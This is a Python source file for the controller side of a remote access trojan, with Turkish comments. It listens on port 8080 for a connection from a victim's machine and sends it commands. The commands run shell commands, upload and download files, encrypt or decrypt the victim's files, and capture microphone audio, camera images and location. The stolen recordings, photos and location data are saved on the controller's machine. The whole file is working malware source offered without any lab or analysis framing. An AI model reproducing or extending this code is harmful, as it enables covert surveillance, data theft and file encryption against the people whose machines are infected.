import socket
import base64
import simplejson

class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening...")
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection OK from " + str(my_address))

    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(4096).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command_input):
        self.json_send(command_input)

        if command_input[0] == "quit":
            self.my_connection.close()
            exit()

        return self.json_receive()

    def save_file(self,path,content):
        with open(path,"wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK"

    def get_file_content(self,path):
        with open(path,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def save_image(self, image_data):
        image_data = base64.b64decode(image_data)
        with open("captured_image.jpg", "wb") as image_file:
            image_file.write(image_data)
        return "Image Saved as captured_image.jpg"

    def save_location(self, location_data):
        # Gelen konum bilgisini yazdırma ve dosyaya kaydetme işlemi
        print(f"Location Information: {location_data}")
        with open("location_info.txt", "a") as location_file:
            location_file.write(f"{location_data}\n")
        return "Location saved to location_info.txt"

    def save_audio(self, audio_data):
        audio_data = base64.b64decode(audio_data)
        with open("captured_audio.wav", "wb") as audio_file:
            audio_file.write(audio_data)
        return "Audio Saved as captured_audio.wav"


    def start_listener(self):
        while True:
            command_input = input("Enter command: ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "decrypt":
                    command_output = self.command_execution(command_input)

                if command_input[0] == "encrypt":
                    command_output = self.command_execution(command_input)

                if command_input[0] == "mic":
                    command_output = self.command_execution(command_input)
                    self.save_audio(command_output)

                if command_input[0] == "camera":
                    command_output = self.command_execution(command_input)
                    self.save_image(command_output)

                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1])
                    command_input.append(my_file_content)

                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)

                if command_input[0] == "location":
                    command_output = self.command_execution(command_input)
                    self.save_location(command_output)  # Konum bilgisini işleme

            except Exception as e:
                command_output = f"Error executing decrypt command: {str(e)}"
            print(command_output)

my_socket_listener = SocketListener("0.0.0.0",8080)
my_socket_listener.start_listener()
